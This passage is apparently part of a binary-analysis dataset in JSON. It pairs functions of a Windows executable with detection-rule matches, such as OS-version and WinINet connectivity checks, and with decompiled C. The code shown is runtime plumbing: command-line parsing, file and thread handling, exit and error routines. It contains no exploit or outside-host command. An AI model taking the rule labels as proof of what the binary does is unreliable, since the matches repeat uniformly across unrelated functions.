0x4967a8;\n    do {\n        *iVar4 = iVar4;\n        *(iVar4 + 4) = iVar4;\n        iVar4 = iVar4 + 8;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    *0x4987ac = 0x4987ac;\n    *0x4987b0 = 0x4987ac;\n    return;\n}\n",
        "token_count": 640
    },
    "00402e94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00402e94(void)\n\n{\n    if (*0x4987c4 != 0) {\n        sub.user32.dll_DestroyWindow(*0x4987c4);\n        *0x4987c4 = 0;\n    }\n    if (*0x4965b4 != '\\0') {\n        fcn.00402820();\n    }\n    if (*0x4987bc != 0) {\n        sub.kernel32.dll_VirtualFree(*0x4987bc, 0, 0x8000);\n        *0x4987bc = 0;\n    }\n    fcn.00402e04();\n    return;\n}\n",
        "token_count": 142
    },
    "00403050": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00403050(void)\n\n{\n    uint8_t in_AL;\n    \n    if (*0x496008 != NULL) {\n        (**0x496008)();\n    }\n    if ((in_AL & 0x7f) == 0) {\n        fcn.00407688();\n    }\n    fcn.00402ff8();\n    return;\n}\n",
        "token_count": 79
    },
    "00402f84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402f84(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00407688();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00407688();\n        return *(*piVar1 + 8);\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "00402fa4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00402fa4(void)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00407688();\n    if (*piVar1 != 0) {\n        piVar1 = fcn.00407688();\n        return *(*piVar1 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 75
    },
    "0040305c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403031)\n// WARNING: Removing unreachable block (ram,0x00403036)\n\nvoid __fastcall fcn.0040305c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00407688(param_1, param_2);\n    if (*(iVar1 + 4) != 0) {\n        if (*0x496008 != NULL) {\n            (**0x496008)();\n        }\n        fcn.00407688();\n        fcn.00402ff8();\n        return;\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "004031fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004031fc(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *in_EAX;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    uint8_t *puVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint8_t *puStack20;\n    \n    while( true ) {\n        while ((*in_EAX != 0 && (*in_EAX < 0x21))) {\n            in_EAX = sub.user32.dll_CharNextA();\n        }\n        puStack20 = in_EAX;\n        if ((*in_EAX != 0x22) || (in_EAX[1] != 0x22)) break;\n        in_EAX = in_EAX + 2;\n    }\n    while (puVar3 = in_EAX,  0x20 < *puVar3) {\n        if (*puVar3 == 0x22) {\n            puVar2 = sub.user32.dll_CharNextA(puVar3);\n            while ((puVar5 = puVar2,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar2 = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n            in_EAX = puVar5;\n            if (*puVar5 != 0) {\n                in_EAX = sub.user32.dll_CharNextA(puVar3);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            in_EAX = sub.user32.dll_CharNextA();\n            puStack20 = puVar3;\n        }\n    }\n    fcn.00405c6c();\n    iVar1 = *param_2;\n    iVar6 = 0;\n    puVar3 = puStack20;\n    while (puVar2 = puVar3,  0x20 < *puVar2) {\n        if (*puVar2 == 0x22) {\n            puVar3 = sub.user32.dll_CharNextA(puVar2);\n            while ((puVar5 = puVar3,  *puVar5 != 0 && (*puVar5 != 0x22))) {\n                puVar4 = sub.user32.dll_CharNextA(puVar2);\n                for (puVar3 = puVar5; puStack20 = puVar5,  puVar3 < puVar4; puVar3 = puVar3 + 1) {\n                    *(iVar1 + iVar6) = *puVar3;\n                    iVar6 = iVar6 + 1;\n                }\n            }\n            puVar3 = puVar5;\n            if (*puVar5 != 0) {\n                puVar3 = sub.user32.dll_CharNextA(puVar2);\n                puStack20 = puVar5;\n            }\n        }\n        else {\n            puVar5 = sub.user32.dll_CharNextA();\n            for (puVar3 = puVar2; puStack20 = puVar2,  puVar3 < puVar5; puVar3 = puVar3 + 1) {\n                *(iVar1 + iVar6) = *puVar3;\n                iVar6 = iVar6 + 1;\n            }\n        }\n    }\n    return CONCAT44(puStack20, puVar2);\n}\n",
        "token_count": 731
    },
    "004032f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403330)\n\nvoid fcn.004032f8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x403349;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    sub.kernel32.dll_GetCommandLineA();\n    fcn.004031fc();\n    fcn.004031fc();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x403350;\n    uStack24 = 0x403348;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 175
    },
    "00403358": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403358(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uchar auStack276 [264];\n    \n    fcn.00405530();\n    if (in_EAX == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(0, auStack276, 0x105);\n        fcn.00405620();\n    }\n    else {\n        sub.kernel32.dll_GetCommandLineA();\n        while( true ) {\n            fcn.004031fc();\n            if ((in_EAX == 0) || (*param_2 == 0)) break;\n            in_EAX = in_EAX + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 158
    },
    "0040484c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040484c(uint param_1, uint param_2)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    uchar in_ZF;\n    \n    fcn.0040481c(param_1);\n    if (!in_ZF) {\n    // WARNING: Could not recover jumptable at 0x00404859. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    if (*0x49602c != NULL) {\n        (**0x49602c)();\n    }\n    *0x492004 = param_2;\n    *0x492000 = 0xd2;\n    fcn.00405388();\n    return;\n}\n",
        "token_count": 168
    },
    "0040349c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040349c(uint param_1, ushort param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    uVar1 = *(in_EAX + 4);\n    if ((uVar1 < 0xd7b0) || (0xd7b3 < uVar1)) {\n        iVar2 = 0x66;\n    }\n    else {\n        if (uVar1 != 0xd7b0) {\n            fcn.00403918();\n        }\n        *(in_EAX + 4) = param_2;\n        if ((*(in_EAX + 0x48) == '\\0') && (*(in_EAX + 0x18) == 0)) {\n            *(in_EAX + 0x18) = 0x4035c4;\n        }\n        iVar2 = (**(in_EAX + 0x18))();\n    }\n    if (iVar2 != 0) {\n        fcn.0040307c();\n    }\n    return iVar2;\n}\n",
        "token_count": 241
    },
    "00403d88": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403d88(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(in_EAX + 1) != 0xd7b0) {\n        if (3 < *(in_EAX + 1) - 0xd7b0) goto code_r0x00403e5c;\n        iVar1 = (*in_EAX[9])();\n        if (iVar1 != 0) {\n            fcn.0040307c();\n        }\n    }\n    *(in_EAX + 1) = 0xd7b3;\n    in_EAX[2] = param_2;\n    in_EAX[9] = 0x403d60;\n    in_EAX[7] = 0x403554;\n    if (*(in_EAX + 0x12) == '\\0') {\n        in_EAX[9] = 0x403554;\n        if (param_1 == 3) {\n            uVar2 = 0xfffffff5;\n        }\n        else {\n            uVar2 = 0xfffffff6;\n        }\n        iVar1 = sub.kernel32.dll_GetStdHandle(uVar2);\n    }\n    else {\n        if (((param_1 != 3) && (param_1 != 2)) && (*(in_EAX + 1) = 0xd7b2,  param_1 != 1)) {\n            *(in_EAX + 1) = 0xd7b1;\n        }\n        iVar1 = sub.kernel32.dll_CreateFileA();\n    }\n    if (iVar1 != -1) {\n        *in_EAX = iVar1;\n        return;\n    }\n    *(in_EAX + 1) = 0xd7b0;\n    sub.kernel32.dll_GetLastError();\ncode_r0x00403e5c:\n    fcn.0040307c();\n    return;\n}\n",
        "token_count": 434
    },
    "00404030": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00404030(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    while (0x40 < param_2) {\n        param_2 = param_2 + -0x40;\n        fcn.00403fdc();\n        iVar2 = fcn.00407688();\n        if (*(iVar2 + 4) != 0) {\n            return in_EAX;\n        }\n    }\n    if (0 < param_2) {\n        puVar3 = 0x404060;\n        if ((*(in_EAX + 4) == -0x284e) || (cVar1 = fcn.00403f98(param_2, 0x404060),  cVar1 != '\\0')) {\n            while( true ) {\n                puVar4 = *(in_EAX + 0x14) + *(in_EAX + 0xc);\n                iVar2 = *(in_EAX + 8) - *(in_EAX + 0xc);\n                if (param_2 < iVar2) break;\n                *(in_EAX + 0xc) = *(in_EAX + 0xc) + iVar2;\n                param_2 = param_2 - iVar2;\n                for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                iVar2 = (**(in_EAX + 0x1c))();\n                if (iVar2 != 0) {\n                    fcn.0040307c();\n                    return in_EAX;\n                }\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + param_2;\n            for (; param_2 != 0; param_2 = param_2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n        return in_EAX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 505
    },
    "00404704": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404704(int32_t **param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x404788;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *param_1 = NULL;\n    iVar1 = fcn.00404798();\n    if (iVar1 != 0) {\n        if (*(iVar1 + 0x14) == 0) {\n            fcn.004046d4();\n            fcn.00407024();\n        }\n        else {\n            *param_1 = in_EAX + *(iVar1 + 0x14);\n            if (*param_1 != NULL) {\n                (**(**param_1 + 4))(*param_1);\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x40478f;\n    uStack32 = 0x404787;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 282
    },
    "00404a48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404a48(uint param_1, uint param_2)\n\n{\n    uint auStack12 [3];\n    \n    if (*0x492028 != '\\0') {\n        auStack12[0] = param_2;\n        (**0x496014)(0xeedfae4, 0, 2, auStack12);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004052fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004052fc(void)\n\n{\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char *pcStack12;\n    uint uStack8;\n    uchar auStack4 [4];\n    \n    if (*0x49604c != '\\0') {\n        if ((*0x496220 == -0x284e) && (*0x496228 != 0)) {\n            uStack8 = 0x405325;\n            (**0x496238)();\n        }\n        pcStack12 = &stack0xfffffffc;\n        uStack8 = 0;\n        pcStack16 = 0x1e;\n        pcStack20 = \"Runtime error     at 00000000\";\n        uStack24 = 0xfffffff5;\n        uStack28 = 0x40533a;\n        uStack28 = sub.kernel32.dll_GetStdHandle();\n        sub.kernel32.dll_WriteFile();\n        uVar1 = sub.kernel32.dll_GetStdHandle(0xfffffff5, 0x405384, 2, &stack0xffffffe4, 0);\n        sub.kernel32.dll_WriteFile(uVar1);\n        return;\n    }\n    if (*0x492030 == '\\0') {\n        uStack8 = 0;\n        pcStack12 = \"Error\";\n        pcStack16 = \"Runtime error     at 00000000\";\n        pcStack20 = NULL;\n        uStack24 = 0x405379;\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00405388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405388(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((*0x4987f0 == 0) && (*0x496048 != NULL)) {\n        do {\n            pcVar1 = *0x496048;\n            *0x496048 = NULL;\n            (*pcVar1)();\n        } while (*0x496048 != NULL);\n    }\n    if (*0x492004 != 0) {\n        fcn.00405268();\n        fcn.004052fc();\n        *0x492004 = 0;\n    }\n    do {\n        if ((*0x4987f0 == 2) && (*0x492000 == 0)) {\n            *0x4987d4 = 0;\n        }\n        fcn.00405110();\n        if (((*0x4987f0 < 2) || (*0x492000 != 0)) && (*0x4987d8 != 0)) {\n            fcn.00406f9c();\n            iVar2 = *(*0x4987d8 + 0x10);\n            if ((iVar2 != *(*0x4987d8 + 4)) && (iVar2 != 0)) {\n                sub.kernel32.dll_FreeLibrary(iVar2);\n            }\n        }\n        fcn.004050e8();\n        if (*0x4987f0 == 1) {\n            (**0x4987ec)();\n        }\n        if (*0x4987f0 != 0) {\n            fcn.004052cc();\n        }\n        if (*0x4987c8 == NULL) {\n            if (*0x496028 != NULL) {\n                (**0x496028)();\n            }\n            sub.kernel32.dll_ExitProcess(*0x492000);\n        }\n        puVar3 = *0x4987c8;\n        puVar4 = 0x4987c8;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 501
    },
    "004054b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004054b4(uint lpThreadId, uint dwCreationFlags, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint in_ECX;\n    uint dwStackSize;\n    \n    if (*0x492038 == NULL) {\n        puVar1 = fcn.00402f00();\n        *puVar1 = in_ECX;\n        puVar1[1] = arg_10h;\n    }\n    else {\n        (**0x492038)();\n    }\n    *0x49604d = 1;\n    sub.kernel32.dll_CreateThread();\n    return;\n}\n",
        "token_count": 130
    },
    "00405514": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405514 noreturn (void)\n\n{\n    if (*0x49203c != NULL) {\n        (**0x49203c)();\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 57
    },
    "004060e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004060e0(void)\n\n{\n    if (*0x492010 != NULL) {\n        (**0x492010)();\n        return;\n    }\n    fcn.00403050();\n    return;\n}\n",
        "token_count": 47
    },
    "004060f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403024)\n\nvoid __fastcall fcn.004060f8(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00405530();\n            }\n            else {\n                fcn.00405554();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405d28();\n            }\n            else {\n                fcn.00405d40();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.004060e0();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.004060f8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004060ac();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.0040700c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x496008 != NULL) {\n                    (**0x496008)();\n                }\n                fcn.00402ff8();\n                return;\n            }\n            do {\n                fcn.00406934();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "004061f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
